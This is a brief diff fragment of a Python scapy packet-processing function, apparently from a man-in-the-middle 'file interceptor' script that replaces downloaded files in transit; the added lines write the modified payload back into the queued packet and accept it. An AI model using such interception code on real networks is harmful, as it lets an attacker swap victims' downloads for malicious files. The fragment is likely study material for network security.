@@ -22,4 +22,6 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
                 modified_packet = set_load(scapy_packet, "") #packet location that will get replaced
-                
+
+                packet.set_payload(str(modified_packet))
+    packet.accept()
